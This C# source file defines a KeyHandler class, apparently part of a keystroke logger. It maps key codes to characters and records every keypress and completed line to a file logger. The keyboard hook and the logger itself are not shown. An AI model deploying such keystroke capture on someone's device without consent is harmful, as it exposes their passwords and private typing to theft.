using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Agente1
{
    public class KeyHandler
    {
        private readonly FileLogger fileLogger;
        private readonly StringBuilder currentLine;
        private bool shiftPressed;

        public KeyHandler(FileLogger fileLogger)
        {
            this.fileLogger = fileLogger;
            currentLine = new StringBuilder();
            shiftPressed = false;
        }

        public void HandleKeyDown(Keys key)
        {
            if (key == Keys.LShiftKey || key == Keys.RShiftKey)
            {
                shiftPressed = true;
            }
            else
            {
                string keyString = GetKeyString(key, shiftPressed);
                HandleKeyPress(keyString);
            }
        }

        public void HandleKeyUp(Keys key)
        {
            if (key == Keys.LShiftKey || key == Keys.RShiftKey)
            {
                shiftPressed = false;
            }
        }

        private string GetKeyString(Keys key, bool shiftPressed)
        {
            switch (key)
            {
                case Keys.D0: return shiftPressed ? ")" : "0";
                case Keys.D1: return shiftPressed ? "!" : "1";
                case Keys.D2: return shiftPressed ? "@" : "2";
                case Keys.D3: return shiftPressed ? "#" : "3";
                case Keys.D4: return shiftPressed ? "$" : "4";
                case Keys.D5: return shiftPressed ? "%" : "5";
                case Keys.D6: return shiftPressed ? "^" : "6";
                case Keys.D7: return shiftPressed ? "&" : "7";
                case Keys.D8: return shiftPressed ? "*" : "8";
                case Keys.D9: return shiftPressed ? "(" : "9";
                case Keys.Enter: return "\n";
                case Keys.Space: return " ";
                default: return key.ToString();
            }
        }

        private void HandleKeyPress(string key)
        {
            if (key == "\n")
            {
                fileLogger.SaveCurrentLine();
                currentLine.Clear();
            }
            else
            {
                currentLine.Append(key);
                fileLogger.SaveKeyPress(key);
            }
        }
    }
}
